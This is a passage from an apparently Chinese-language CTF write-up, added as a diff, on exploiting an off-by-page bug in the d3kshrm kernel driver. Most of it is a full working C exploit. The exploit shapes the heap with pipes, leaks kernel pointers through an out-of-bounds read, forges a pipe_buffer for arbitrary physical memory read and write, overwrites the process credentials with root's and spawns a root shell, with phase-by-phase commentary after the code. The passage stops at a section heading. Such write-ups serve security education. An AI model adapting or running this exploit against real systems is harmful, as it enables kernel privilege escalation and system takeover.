@@ -2428,8 +2428,1663 @@ close(victim_fd);
               height: auto;">
 </div>
 
+## 5. 进阶分析：任意读写原语
+
+exploit核心代码如下：
+
+```c
+#define ANON_PIPE_BUF_OPS 0xffffffff82429608
+#ifdef SECONDARY_STARTUP_64
+#undef SECONDARY_STARTUP_64
+#endif
+#define SECONDARY_STARTUP_64 0xffffffff8123c600
+
+#define CHUNK_COUNT 0x20
+#define MAX_PIPE_COUNT 0xf0
+
+#define DEVICE_PATH "/proc/d3kshrm"
+
+#define CMD_CREATE_CHUNK 0x3361626e
+#define CMD_DELETE_CHUNK 0x74747261
+#define CMD_BIND_CHUNK 0x746e6162
+#define CMD_UNBIND_CHUNK 0x33746172
+
+#define VULN_CHUNK_SIZE 0x200
+#define PIPE_BUF_SIZE (0x1000 * 64)
+#define MMAP_SIZE (0x1000 * 0x200)
+#define MREMAP_SIZE (0x1000 * 0x201)
+
+// Live task_struct addressing state during the exploit
+size_t current_task_addr;                           // Virtual address of current task_struct
+size_t current_task_page_addr;                      // Physical page holding current task_struct
+size_t parent_task_addr;                            // Virtual address of parent task_struct
+size_t root_task_addr;                              // Virtual address of root task_struct (swapper/init)
+size_t root_task_page_addr;                         // Physical page holding root task_struct
+size_t root_cred_addr;                              // Virtual address of root credentials
+size_t root_nsproxy_addr;                           // Virtual address of root namespace proxy
+
+int pipe_fds[MAX_PIPE_COUNT * 2][2];
+int chunk_ids[CHUNK_COUNT * 2];
+int dev_fd[CHUNK_COUNT * 2];
+void *victim_map[CHUNK_COUNT * 2];
+int victim_pipe_idx = -1;
+int victim_chunk_idx = -1;
+int second_victim_pipe_idx = -1;
+int second_victim_chunk_idx = -1;
+size_t pipe_buffer_data[0x1000];
+struct pipe_buffer fake_pipe_buf = {0};
+size_t *leak_data;
+/*==========================================================================*
+ * PIPELINE MANAGEMENT
+ *==========================================================================*/
+
+/**
+ * create_pipe - Create pipe for heap shaping
+ * @pipe_idx: Index in global pipe array
+ */
+void create_pipe(int pipe_idx) {
+    if (pipe(pipe_fds[pipe_idx]) < 0) {
+        log.error("Pipe creation failed at index %d", pipe_idx);
+        exit(EXIT_FAILURE);
+    }
+}
+
+/**
+ * resize_pipe_buffer - Adjust pipe buffer size via fcntl
+ * @pipe_idx: Pipe index in global array
+ * @new_size: Target pipe capacity
+ */
+void resize_pipe_buffer(int pipe_idx, int new_size) {
+    if (fcntl(pipe_fds[pipe_idx][0], F_SETPIPE_SZ, new_size) < 0) {
+        log.error("Pipe resize failed for pipe %d", pipe_idx);
+        exit(EXIT_FAILURE);
+    }
+}
+
+/*==========================================================================*
+ * DEVICE IOCTL INTERFACE
+ *==========================================================================*/
+
+/**
+ * create_chunk - Allocate kernel chunk via device ioctl
+ * @dev_fd: Open device file descriptor
+ * @num: Allocation size parameter
+ * Returns: Chunk identifier
+ */
+int create_chunk(int dev_fd, size_t num) {
+    return ioctl(dev_fd, CMD_CREATE_CHUNK, num);
+}
+
+/**
+ * delete_chunk - Free kernel chunk via device ioctl
+ * @dev_fd: Open device file descriptor
+ * @index: Chunk identifier to free
+ */
+void delete_chunk(int dev_fd, size_t index) {
+    ioctl(dev_fd, CMD_DELETE_CHUNK, index);
+}
+
+/**
+ * bind_chunk - Establish chunk mapping context
+ * @dev_fd: Open device file descriptor
+ * @id: Chunk identifier to bind
+ */
+void bind_chunk(int dev_fd, size_t id) {
+    ioctl(dev_fd, CMD_BIND_CHUNK, id);
+}
+
+/**
+ * unbind_chunk - Release chunk mapping context
+ * @dev_fd: Open device file descriptor
+ * @index: Chunk identifier to unbind
+ */
+void unbind_chunk(int dev_fd, size_t index) {
+    ioctl(dev_fd, CMD_UNBIND_CHUNK, index);
+}
+
+/*==========================================================================*
+ * ARBITRARY PHYSICAL MEMORY ACCESS
+ *==========================================================================*/
+
+/**
+ * arbitrary_phys_read - Read arbitrary physical memory through pipe primitive
+ * @target_page: Physical page address
+ * @page_offset: Offset within target page
+ * @output_buffer: Destination buffer for read data
+ * @read_length: Number of bytes to read
+ */
+void arbitrary_phys_read(uint64_t target_page, uint32_t page_offset,
+                         void *output_buffer, uint64_t read_length) {
+    fake_pipe_buf.page = (struct page *)target_page;
+    fake_pipe_buf.offset = page_offset;
+    fake_pipe_buf.len = 0xfff;
+    memcpy(leak_data, &fake_pipe_buf, sizeof(struct pipe_buffer));
+    read(pipe_fds[second_victim_pipe_idx][0], output_buffer, read_length);
+}
+
+/**
+ * arbitrary_phys_write - Write arbitrary physical memory through pipe primitive
+ * @target_page: Physical page address
+ * @page_offset: Offset within target page
+ * @input_data: Source buffer containing write data
+ * @write_length: Number of bytes to write
+ */
+void arbitrary_phys_write(uint64_t target_page, uint32_t page_offset,
+                          void *input_data, uint64_t write_length) {
+    fake_pipe_buf.page = (struct page *)target_page;
+    fake_pipe_buf.offset = page_offset;
+    fake_pipe_buf.len = 0;
+    memcpy(leak_data, &fake_pipe_buf, sizeof(struct pipe_buffer));
+    write(pipe_fds[second_victim_pipe_idx][1], input_data, write_length);
+}
+
+/*==========================================================================*
+ * KERNEL ADDRESS RESOLUTION
+ *==========================================================================*/
+
+/**
+ * find_vmemmap_base - Locate vmemmap base via physical memory scanning
+ *
+ * Strategy: Scan backward from leaked page pointer to find kernel code region
+ */
+void find_vmemmap_base(void) {
+    // Start scan from page-aligned address derived from leaked page pointer
+    vmemmap_base = (size_t)fake_pipe_buf.page & 0xfffffffff0000000;
+    size_t round = 0;
+
+    for (round = 0;; round++) {
+        size_t candidate_value[4] = {0};
+        arbitrary_phys_read((vmemmap_base + 0x2740), 0, candidate_value, 0x10);
+
+        // Verify candidate matches secondary_startup_64 signature and kernel base constraints
+        if (candidate_value[0] > kernel_base &&
+            ((candidate_value[0] & 0xfff) == (SECONDARY_STARTUP_64 & 0xfff))) {
+            log.success("Located secondary_startup_64 signature in physmem, addr=0x%lx",
+                        candidate_value[0]);
+            break;
+        }
+        vmemmap_base -= 0x10000000;  // Step backward through physical memory regions
+    }
+    log.success("Successfully mapped vmemmap_base address: 0x%lx", vmemmap_base);
+}
+
+/*==========================================================================*
+ * TASK_STRUCT ENUMERATION
+ *==========================================================================*/
+
+/**
+ * scan_for_task_structs - Locate current and root task_structs in physical memory
+ *
+ * Strategy: Scan physical pages for process comm strings and validate task_struct fields
+ */
+void scan_for_task_structs(void) {
+    size_t round = 0;
+    int current_task_found = 0;
+    int root_task_found = 0;
+    char page_content_buffer[0x1000] = {0};
+    size_t *current_comm_ptr;
+    size_t *root_comm_ptr;
+
+    // Set unique process identifier for reliable memory scanning
+    prctl(PR_SET_NAME, "pwn4kernel");
+    log.info("Scanning physical memory pages to identify active task_struct instances");
+
+    for (round = 0;; round++) {
+        memset(page_content_buffer, 0, 0x1000);
+        arbitrary_phys_read((vmemmap_base + round * 0x40), 0, page_content_buffer, 0xf00);
+
+        current_comm_ptr = (size_t *)memmem(page_content_buffer, 0xf00, "pwn4kernel", 10);
+        root_comm_ptr = (size_t *)memmem(page_content_buffer, 0xf00, "swapper", 7);
+
+        // Validate current task_struct by checking critical field integrity
+        if (current_comm_ptr && (current_comm_ptr[-2] > 0xffff888000000000)   // cred validity
+            && (current_comm_ptr[-3] > 0xffff888000000000)                    // real_cred validity
+            && (current_comm_ptr[-59] > 0xffff888000000000)                   // real_parent validity
+            && (current_comm_ptr[-58] > 0xffff888000000000)) {                // parent validity
+            current_task_found++;
+            parent_task_addr = current_comm_ptr[-59];  // Capture parent pointer
+
+            // Derive task_struct address from ptraced field pointer
+            current_task_addr = current_comm_ptr[-52] - 0x5d8;
+
+            // Calculate page_offset_base from physical memory mapping
+            page_offset_base = (current_comm_ptr[-52] & 0xfffffffffffff000) - round * 0x1000;
+            page_offset_base &= 0xfffffffff0000000;
+
+            current_task_page_addr = (vmemmap_base + round * 0x40);
+            log.success("[Round %d] Mapped current task_struct to phys page: 0x%lx", round,
+                        current_task_page_addr);
+            log.success("[Round %d] Resolved page_offset_base mapping addr: 0x%lx", round,
+                        page_offset_base);
+            log.success("[Round %d] Captured parent task_struct virt addr: 0x%lx", round,
+                        parent_task_addr);
+            log.success("[Round %d] Resolved current task_struct virt addr: 0x%lx", round,
+                        current_task_addr);
+            if (current_task_found && root_task_found)
+                break;
+        }
+
+        // Validate root task_struct (swapper) by field integrity
+        if (root_comm_ptr && (root_comm_ptr[-2] > 0xffff888000000000)   // cred validity
+            && (root_comm_ptr[-3] > 0xffff888000000000)                // real_cred validity
+            && (root_comm_ptr[-59] > 0xffff888000000000)               // real_parent validity
+            && (root_comm_ptr[-58] > 0xffff888000000000)) {            // parent validity
+
+            if (root_task_found)
+                continue;
+
+            root_task_found++;
+            root_cred_addr = root_comm_ptr[-3];     // Capture root cred pointer
+            root_task_addr = root_comm_ptr[-52] - 0x5d8;  // Derive root task address
+            root_nsproxy_addr = root_comm_ptr[9];   // Capture root nsproxy pointer
+            root_task_page_addr = (vmemmap_base + round * 0x40);
+            log.success("[Round %d] Mapped root swapper task_struct to phys page: 0x%lx", round,
+                        root_task_page_addr);
+            log.success("[Round %d] Resolved root task_struct virtual addr: 0x%lx", round,
+                        root_task_addr);
+            log.success("[Round %d] Captured root credentials virt addr: 0x%lx", round,
+                        root_cred_addr);
+            log.success("[Round %d] Resolved root nsproxy virt addr: 0x%lx", round,
+                        root_nsproxy_addr);
+            if (current_task_found && root_task_found)
+                break;
+        }
+    }
+}
+
+/*==========================================================================*
+ * PRIVILEGE ESCALATION
+ *==========================================================================*/
+
+/**
+ * overwrite_cred_with_root - Replace current task credentials with root credentials
+ *
+ * Strategy: Overwrite current task_struct's cred/real_cred pointers to point to root's
+ */
+void overwrite_cred_with_root(void) {
+    size_t round = 0;
+    char task_copy_buffer[0x1000] = {0};
+    size_t *current_comm_field_ptr;
+
+    log.info("Modifying current task_struct credentials to gain root privileges");
+    for (round = 0;; round++) {
+        memset(task_copy_buffer, 0, 0x1000);
+        arbitrary_phys_read((current_task_page_addr + round * 0x40), 0, task_copy_buffer, 0xf00);
+
+        current_comm_field_ptr = (size_t *)memmem(task_copy_buffer, 0xf00, "pwn4kernel", 10);
+
+        // Validate task_struct integrity before modification
+        if (current_comm_field_ptr && (current_comm_field_ptr[-2] > 0xffff888000000000) &&
+            (current_comm_field_ptr[-3] > 0xffff888000000000) &&
+            (current_comm_field_ptr[-59] > 0xffff888000000000) &&
+            (current_comm_field_ptr[-58] > 0xffff888000000000)) {
+            // Replace credential pointers with root equivalents
+            current_comm_field_ptr[-2] = root_cred_addr;  // Overwrite task->cred
+            current_comm_field_ptr[-3] = root_cred_addr;  // Overwrite task->real_cred
+            current_comm_field_ptr[9] = root_nsproxy_addr;  // Overwrite task->nsproxy
+
+            // Commit modified task_struct to physical memory
+            arbitrary_phys_write((current_task_page_addr + round * 0x40), 0, task_copy_buffer, 0xf00);
+
+            log.success("[Round %d] Credential patching complete at phys page: 0x%lx", round,
+                        current_task_page_addr);
+            break;
+        }
+    }
+}
+
+/*==========================================================================*
+ * EXPLOIT PHASE FUNCTIONS
+ *==========================================================================*/
+
+/**
+ * phase_environment_bootstrap - Initialize exploit environment
+ * Description: Open device file descriptors for the exploit
+ */
+int phase_environment_bootstrap(void) {
+    log.info("===========================================================");
+    log.info("PHASE 1: ENVIRONMENT INITIALIZATION & DEVICE SETUP         ");
+    log.info("===========================================================");
+
+    log.info("Initializing exploit environment");
+    bind_core(0);
+    save_status();
+
+    log.info("Opening " DEVICE_PATH " device file");
+    for (int i = 0; i < CHUNK_COUNT * 2; i++) {
+        dev_fd[i] = open(DEVICE_PATH, O_RDWR);
+        if (dev_fd[i] < 0) {
+            log.error("Failed to open device file");
+            return -1;
+        }
+    }
+
+    return 0;
+}
+
+/**
+ * phase_heap_fengshui - Prepare heap layout for exploitation
+ * Description: Create pipes, spray order-3 pages, free odd/even pages, and allocate vulnerable chunks
+ */
+int phase_heap_fengshui(void) {
+    log.info("===========================================================");
+    log.info("PHASE 2: HEAP SHAPING & MEMORY LAYOUT MANIPULATION         ");
+    log.info("===========================================================");
+
+    log.info("Creating %d pipes for heap shaping", MAX_PIPE_COUNT);
+    for (int i = 0; i < MAX_PIPE_COUNT; i++) {
+        create_pipe(i);
+    }
+
+    log.info("Spraying %d order-3 pages via chunk allocation", CHUNK_COUNT);
+    for (int i = 0; i < CHUNK_COUNT; i++) {
+        chunk_ids[i] = create_chunk(dev_fd[0], 0);
+    }
+
+    log.info("Freeing odd-indexed order-3 pages");
+    for (int i = 1; i < CHUNK_COUNT; i += 2) {
+        delete_chunk(dev_fd[0], chunk_ids[i]);
+    }
+
+    log.info("Spraying kmalloc-4k pipe buffers into freed odd slots");
+    for (int i = 0; i < MAX_PIPE_COUNT; i++) {
+        resize_pipe_buffer(i, PIPE_BUF_SIZE);
+    }
+
+    log.info("Freeing even-indexed order-3 pages");
+    for (int i = 0; i < CHUNK_COUNT; i += 2) {
+        delete_chunk(dev_fd[0], chunk_ids[i]);
+    }
+
+    log.info("Allocating vuln chunks in freed even slots");
+    for (int i = 0; i < CHUNK_COUNT; i++) {
+        chunk_ids[i] = create_chunk(dev_fd[i], VULN_CHUNK_SIZE);
+    }
+
+    return 0;
+}
+
+/**
+ * phase_prepare_oob_detection - Prepare for OOB read detection
+ * Description: Write magic numbers and indices to pipes for identification,
+ *              then trigger d3kshrm_mmap via mmap()/mremap() to establish
+ *              memory layout for OOB read detection
+ */
+int phase_prepare_oob_detection(void) {
+    log.info("===========================================================");
+    log.info("PHASE 3: PREPARING OOB READ DETECTION                     ");
+    log.info("===========================================================");
+
+    log.info("Writing magic numbers and indices to pipes for identification");
+    for (int i = 0; i < MAX_PIPE_COUNT; i++) {
+        pipe_buffer_data[0] = *(size_t *)"BinRacer";  // Magic number for validation
+        pipe_buffer_data[1] = i;                      // Pipe index for identification
+        write(pipe_fds[i][1], pipe_buffer_data, 0x10);
+    }
+
+    log.info("Triggering d3kshrm_mmap and extending mapping to establish overlap");
+    for (int i = 0; i < CHUNK_COUNT; i++) {
+        bind_chunk(dev_fd[i], chunk_ids[i]);
+        victim_map[i] =
+            mmap(NULL, MMAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, dev_fd[i], 0);
+        if (victim_map[i] == MAP_FAILED) {
+            log.error("mmap() failed on chunk %d", i);
+            return -1;
+        }
+
+        victim_map[i] = mremap(victim_map[i], MMAP_SIZE, MREMAP_SIZE, MREMAP_MAYMOVE);
+        if (victim_map[i] == MAP_FAILED) {
+            log.error("mremap() failed to extend mapping for chunk %d", i);
+            return -1;
+        }
+    }
+
+    return 0;
+}
+
+/**
+ * phase_oob_detection_via_page_fault - Detect pipe overlap via page faults
+ * Description: Trigger page faults to detect magic number 0x72656361526e6942 ("BinRacer")
+ */
+int phase_oob_detection_via_page_fault(void) {
+    log.info("===========================================================");
+    log.info("PHASE 4: DETECTING OOB READ VIA PAGE FAULTS                ");
+    log.info("===========================================================");
+
+    log.info("Triggering page faults to detect magic number 0x72656361526e6942 (BinRacer)");
+    for (int i = 0; i < CHUNK_COUNT; i++) {
+        log.debug("Testing chunk %d", i);
+        leak_data = (size_t *)(victim_map[i] + 0x1000 * 0x200);
+        if (leak_data[0] == 0x72656361526e6942) {  // "BinRacer" in little endian
+            victim_chunk_idx = i;
+            victim_pipe_idx = ((size_t *)(victim_map[i] + 0x1000 * 0x200))[1];
+            log.success("Found Victim pipe: %d, Victim chunk: %d", victim_pipe_idx,
+                        victim_chunk_idx);
+            hex_dump("Victim pipe data", leak_data, 0x30);
+            break;
+        }
+    }
+
+    if (victim_pipe_idx == -1) {
+        log.error("No victim pipe detected! Exploit failed at initial OOB detection");
+        return -1;
+    }
+
+    return 0;
+}
+
+/**
+ * phase_cleanup_and_order0_spray - Clean victim pipe and spray order-0 objects
+ * Description: Close victim pipe, release its page via munmap, spray kmalloc-192/order-0,
+ *              free device chunk, and re-spray driver chunks to occupy freed memory
+ */
+int phase_cleanup_and_order0_spray(void) {
+    log.info("===========================================================");
+    log.info("PHASE 5: CLEANUP & ORDER-0 HEAP SPRAY                      ");
+    log.info("===========================================================");
+
+    log.info("Cleaning victim pipe and preparing for second stage spray");
+    close(pipe_fds[victim_pipe_idx][0]);
+    close(pipe_fds[victim_pipe_idx][1]);
+    munmap(victim_map[victim_chunk_idx], MREMAP_SIZE);
+
+    log.info("Spraying kmalloc-192/order-0 objects via pipe buffer resize");
+    for (int i = 0; i < MAX_PIPE_COUNT; i++) {
+        if (i == victim_pipe_idx)
+            continue;
+        resize_pipe_buffer(i, 0x1000 * 4);
+    }
+
+    log.info("Freeing victim device chunk for reallocation");
+    unbind_chunk(dev_fd[victim_chunk_idx], chunk_ids[victim_chunk_idx]);
+    delete_chunk(dev_fd[victim_chunk_idx], chunk_ids[victim_chunk_idx]);
+
+    log.info("Spraying driver chunks to occupy freed memory regions");
+    for (int i = CHUNK_COUNT; i < CHUNK_COUNT * 2; i++) {
+        chunk_ids[i] = create_chunk(dev_fd[i], VULN_CHUNK_SIZE);
+    }
+
+    log.info("Triggering d3kshrm_mmap and extending mapping for second stage");
+    for (int i = CHUNK_COUNT; i < CHUNK_COUNT * 2; i++) {
+        bind_chunk(dev_fd[i], chunk_ids[i]);
+        victim_map[i] =
+            mmap(NULL, MMAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, dev_fd[i], 0);
+        if (victim_map[i] == MAP_FAILED) {
+            log.error("mmap() failed on chunk %d", i);
+            return -1;
+        }
+
+        victim_map[i] = mremap(victim_map[i], MMAP_SIZE, MREMAP_SIZE, MREMAP_MAYMOVE);
+        if (victim_map[i] == MAP_FAILED) {
+            log.error("mremap() failed to extend mapping for chunk %d", i);
+            return -1;
+        }
+    }
+
+    return 0;
+}
+
+/**
+ * phase_kernel_pointer_leak_via_oob - Leak kernel pointers via OOB read
+ * Description: Use driver page fault to read pipe_buffer structure, leaking kernel page
+ *              and function pointer addresses
+ */
+int phase_kernel_pointer_leak_via_oob(void) {
+    log.info("===========================================================");
+    log.info("PHASE 6: KERNEL POINTER LEAK VIA OOB READ                  ");
+    log.info("===========================================================");
+
+    log.info("Scanning for kernel pointers in second victim chunk");
+    for (int i = CHUNK_COUNT; i < CHUNK_COUNT * 2; i++) {
+        log.debug("Testing chunk %d", i);
+        leak_data = (size_t *)(victim_map[i] + 0x1000 * 0x200);
+        if (leak_data[0] > vmemmap_base && leak_data[2] > kernel_base) {
+            memset(&fake_pipe_buf, 0, sizeof(struct pipe_buffer));
+            memcpy(&fake_pipe_buf, leak_data, sizeof(struct pipe_buffer));
+            second_victim_chunk_idx = i;
+            kernel_offset = leak_data[2] - ANON_PIPE_BUF_OPS;
+            kernel_base += kernel_offset;
+            log.success("Found Second Victim chunk: %d", second_victim_chunk_idx);
+            log.success("Leaked pipe_buffer->page kernel pointer: 0x%lx", leak_data[0]);
+            log.success("Leaked pipe_buffer->ops(anon_pipe_buf_ops) function pointer: 0x%lx",
+                        leak_data[2]);
+            log.success("kernel base address: 0x%lx", kernel_base);
+            log.success("kernel ASLR offset delta: 0x%lx", kernel_offset);
+            hex_dump("Leaked pipe_buffer structure", leak_data, 0x30);
+            break;
+        }
+    }
+
+    if (second_victim_chunk_idx == -1) {
+        log.error("No second victim pipe detected! Kernel pointer leak failed");
+        return -1;
+    }
+
+    return 0;
+}
+
+/**
+ * phase_arbitrary_phys_rw_primitive - Establish arbitrary physical R/W primitive
+ * Description: Modify target pipe_buffer->offset to skip magic number, then identify
+ *              correct pipe for arbitrary physical memory operations
+ */
+int phase_arbitrary_phys_rw_primitive(void) {
+    log.info("===========================================================");
+    log.info("PHASE 7: ARBITRARY PHYSICAL MEMORY R/W PRIMITIVE           ");
+    log.info("===========================================================");
+
+    log.info("Configuring arbitrary physical memory read/write primitive");
+    fake_pipe_buf.offset = 0x8;  // Skip magic number to identify correct pipe
+    memcpy(leak_data, &fake_pipe_buf, sizeof(struct pipe_buffer));
+
+    log.info("Scanning pipes to identify target for arbitrary R/W operations");
+    for (int i = 0; i < MAX_PIPE_COUNT; i++) {
+        if (i == victim_pipe_idx)
+            continue;
+        size_t magic = 0;
+        read(pipe_fds[i][0], &magic, 0x8);
+        if (magic != 0x72656361526e6942) {  // Check for "BinRacer" magic
+            second_victim_pipe_idx = i;
+            log.success("Found target pipe for arbitrary R/W: %d", second_victim_pipe_idx);
+            break;
+        }
+    }
+
+    if (second_victim_pipe_idx == -1) {
+        log.error("Failed to locate target pipe for arbitrary R/W operations");
+        return -1;
+    }
+
+    return 0;
+}
+
+/**
+ * phase_kernel_memory_scanning - Scan physical memory for kernel structures
+ * Description: Find vmemmap_base and locate current/root task_structs
+ */
+int phase_kernel_memory_scanning(void) {
+    log.info("===========================================================");
+    log.info("PHASE 8: KERNEL MEMORY SCANNING & STRUCTURE LOCALIZATION   ");
+    log.info("===========================================================");
+
+    log.info("Initiating kernel memory exploration phase");
+    find_vmemmap_base();
+    scan_for_task_structs();
+
+    return 0;
+}
+
+/**
+ * phase_privilege_escalation - Escalate privileges to root
+ * Description: Overwrite current task credentials with root credentials and spawn shell
+ */
+int phase_privilege_escalation(void) {
+    log.info("===========================================================");
+    log.info("PHASE 9: CREDENTIAL OVERWRITE & PRIVILEGE ESCALATION       ");
+    log.info("===========================================================");
+
+    overwrite_cred_with_root();
+    get_root_shell();
+    return 0;
+}
+
+/**
+ * phase_resource_cleanup - Clean up resources
+ */
+void phase_resource_cleanup(void) {
+    log.info("===========================================================");
+    log.info("PHASE 10: RESOURCE CLEANUP & FINALIZATION                  ");
+    log.info("===========================================================");
+
+    log.info("Performing resource cleanup");
+
+    // Close device file descriptors
+    for (int i = 0; i < CHUNK_COUNT * 2; i++) {
+        if (dev_fd[i] > 0) {
+            close(dev_fd[i]);
+        }
+    }
+
+    // Unmap victim mappings
+    for (int i = 0; i < CHUNK_COUNT * 2; i++) {
+        if (victim_map[i] != MAP_FAILED && victim_map[i] != NULL) {
+            munmap(victim_map[i], MREMAP_SIZE);
+        }
+    }
+
+    // Close pipe file descriptors
+    for (int i = 0; i < MAX_PIPE_COUNT; i++) {
+        if (pipe_fds[i][0] > 0) {
+            close(pipe_fds[i][0]);
+        }
+        if (pipe_fds[i][1] > 0) {
+            close(pipe_fds[i][1]);
+        }
+    }
+
+    log.info("Cleanup completed");
+}
+
+/*==========================================================================*
+ * MAIN EXPLOIT ORCHESTRATION
+ *==========================================================================*/
+
+int main() {
+    //==================================================================
+    // PHASE 1: ENVIRONMENT BOOTSTRAP
+    //==================================================================
+    if (phase_environment_bootstrap()) goto cleanup;
+    puts("");
+
+    //==================================================================
+    // PHASE 2: HEAP FENGSHUI PREPARATION
+    //==================================================================
+    if (phase_heap_fengshui()) goto cleanup;
+    puts("");
+
+    //==================================================================
+    // PHASE 3: PREPARING OOB READ DETECTION
+    //==================================================================
+    if (phase_prepare_oob_detection()) goto cleanup;
+    puts("");
+
+    //==================================================================
+    // PHASE 4: OOB DETECTION VIA PAGE FAULTS
+    //==================================================================
+    if (phase_oob_detection_via_page_fault()) goto cleanup;
+    puts("");
+
+    //==================================================================
+    // PHASE 5: CLEANUP & ORDER-0 HEAP SPRAY
+    //==================================================================
+    if (phase_cleanup_and_order0_spray()) goto cleanup;
+    puts("");
+
+    //==================================================================
+    // PHASE 6: KERNEL POINTER LEAK VIA OOB READ
+    //==================================================================
+    if (phase_kernel_pointer_leak_via_oob()) goto cleanup;
+    puts("");
+
+    //==================================================================
+    // PHASE 7: ARBITRARY PHYSICAL MEMORY R/W PRIMITIVE
+    //==================================================================
+    if (phase_arbitrary_phys_rw_primitive()) goto cleanup;
+    puts("");
+
+    //==================================================================
+    // PHASE 8: KERNEL MEMORY SCANNING & STRUCTURE LOCALIZATION
+    //==================================================================
+    if (phase_kernel_memory_scanning()) goto cleanup;
+    puts("");
+
+    //==================================================================
+    // PHASE 9: PRIVILEGE ESCALATION & ROOT ACCESS
+    //==================================================================
+    if (phase_privilege_escalation()) goto cleanup;
+    puts("");
+
+cleanup:
+    //==================================================================
+    // PHASE 10: RESOURCE CLEANUP
+    //==================================================================
+    phase_resource_cleanup();
+    return 0;
+}
+```
+
+### 5-1. 整体流程架构
+
+在第三章成功验证了Off-by-Page边界检查漏洞的基础上，本章进一步展示了如何利用该漏洞构建强大的任意物理内存读写原语，并最终实现权限提升验证。整个进阶验证过程分为十个逻辑阶段，从基础的OOB读取到最终的权限提升，形成完整的验证链。
+
+**核心进阶思路**：在已获得的越界访问能力基础上，通过精心设计的多阶段内存操作，逐步提升访问能力，最终构建任意物理内存读写原语，实现对关键内核数据结构的定位和修改。
+
+```mermaid
+flowchart TD
+    Start[开始进阶验证] --> Phase1[第一阶段: 环境初始化]
+    Phase1 --> Phase2[第二阶段: 堆布局构造]
+    Phase2 --> Phase3[第三阶段: OOB检测准备]
+    Phase3 --> Phase4[第四阶段: OOB检测执行]
+    Phase4 --> Phase5[第五阶段: 清理与二次喷洒]
+    Phase5 --> Phase6[第六阶段: 内核指针泄漏]
+    Phase6 --> Phase7[第七阶段: 物理内存R/W原语]
+    Phase7 --> Phase8[第八阶段: 内核内存扫描]
+    Phase8 --> Phase9[第九阶段: 权限提升验证]
+    Phase9 --> Phase10[第十阶段: 资源清理]
+    Phase10 --> End[验证完成]
+```
+
+#### 5-1-1. 各阶段技术目标
+
+**第一阶段：环境初始化**（Phase 1）
+
+- 建立稳定的执行环境
+- 准备必要的文件描述符资源
+- 为复杂内存操作建立基础
+
+**第二阶段：堆布局构造**（Phase 2）
+
+- 通过交替分配释放塑造特定内存布局
+- 实现pages数组与pipe_buffer交错分布
+- 为越界访问创造目标页面条件
+
+**第三阶段：OOB检测准备**（Phase 3）
+
+- 在管道缓冲区中写入标识数据
+- 建立用户空间内存映射
+- 为OOB检测建立观察窗口
+
+**第四阶段：OOB检测执行**（Phase 4）
+
+- 触发边界检查漏洞
+- 验证是否成功访问到目标pipe_buffer
+- 记录成功的chunk和管道索引
+
+**第五阶段：清理与二次喷洒**（Phase 5）
+
+- 清理第一阶段资源
+- 重新构造内存布局
+- 为内核指针泄漏准备条件
+
+**第六阶段：内核指针泄漏**（Phase 6）
+
+- 通过OOB读取泄漏内核指针
+- 计算内核地址空间偏移
+- 建立内核地址映射关系
+
+**第七阶段：物理内存R/W原语**（Phase 7）
+
+- 构建任意物理内存读写能力
+- 建立稳定的内存访问通道
+- 验证原语的有效性
+
+**第八阶段：内核内存扫描**（Phase 8）
+
+- 扫描物理内存定位关键结构
+- 查找当前进程和root进程task_struct
+- 建立进程数据结构映射
+
+**第九阶段：权限提升验证**（Phase 9）
+
+- 修改当前进程凭证
+- 验证权限提升效果
+- 获取root权限shell
+
+**第十阶段：资源清理**（Phase 10）
+
+- 释放所有分配的资源
+- 确保系统状态恢复
+- 避免资源泄漏
+
+#### 5-1-2. 关键数据结构扩展
+
+在进阶验证中，需要扩展第三章的数据结构，以支持更复杂的操作。虽然数组声明为`MAX_PIPE_COUNT * 2`，但实际只使用前MAX_PIPE_COUNT（240）个管道，这为内存操作提供了足够的缓冲区。
+
+```c
+// 扩展的全局数据结构
+int pipe_fds[MAX_PIPE_COUNT * 2][2];   // 管道文件描述符数组
+int chunk_ids[CHUNK_COUNT * 2];        // chunk索引数组
+int dev_fd[CHUNK_COUNT * 2];           // 设备文件描述符数组
+void *victim_map[CHUNK_COUNT * 2];     // 内存映射地址数组
+
+// 关键状态变量
+int victim_pipe_idx = -1;              // 目标管道索引
+int victim_chunk_idx = -1;             // 目标chunk索引
+int second_victim_pipe_idx = -1;       // 第二目标管道索引
+int second_victim_chunk_idx = -1;      // 第二目标chunk索引
+
+// 内核地址信息
+size_t vmemmap_base;                   // vmemmap基地址
+size_t page_offset_base;               // page_offset_base
+size_t kernel_base;                    // 内核基地址
+size_t kernel_offset;                  // 内核偏移量
+
+// 进程结构信息
+size_t current_task_addr;              // 当前进程task_struct虚拟地址
+size_t current_task_page_addr;         // 当前进程物理页面地址
+size_t parent_task_addr;               // 父进程task_struct地址
+size_t root_task_addr;                 // root进程task_struct地址
+size_t root_task_page_addr;            // root进程物理页面地址
+size_t root_cred_addr;                 // root凭证地址
+size_t root_nsproxy_addr;              // root命名空间代理地址
+```
+
+### 5-2. 第一阶段：环境初始化
+
+在开始复杂的内存操作之前，必须建立一个稳定、可控的执行环境。内核内存分配具有高度的随机性和并发性，这对精确构造内存布局构成了挑战。本阶段的目标是扩展基础资源，为后续的多阶段验证做好准备。
+
+首先保存当前进程的完整执行状态，为可能的异常恢复做准备。通过内联汇编保存CS、SS、RSP和RFLAGS寄存器值。这些寄存器定义了进程的执行上下文，保存它们为异常恢复提供了基础。
+
+接着将当前进程绑定到CPU 0，减少多核环境下的并发内存分配干扰。通过调用`sched_setaffinity`系统调用实现CPU绑定，这提高了内存布局的可预测性和稳定性，避免了缓存一致性问题和TLB刷新带来的不确定性。
+
+与第三章不同，进阶验证需要更多的资源。需要打开64个设备文件描述符（`CHUNK_COUNT * 2`），每个描述符对应一个chunk实例。这个数量经过精心计算，既要确保有足够的chunk来支持多阶段验证，又要避免过度消耗系统资源。
+
+```c
+int phase_environment_bootstrap(void) {
+    log.info("===========================================================");
+    log.info("PHASE 1: ENVIRONMENT INITIALIZATION & DEVICE SETUP         ");
+    log.info("===========================================================");
+
+    log.info("Initializing exploit environment");
+    bind_core(0);
+    save_status();
+
+    log.info("Opening " DEVICE_PATH " device file");
+    for (int i = 0; i < CHUNK_COUNT * 2; i++) {
+        dev_fd[i] = open(DEVICE_PATH, O_RDWR);
+        if (dev_fd[i] < 0) {
+            log.error("Failed to open device file");
+            return -1;
+        }
+    }
+
+    return 0;
+}
+```
+
+### 5-3. 第二阶段：堆布局构造
+
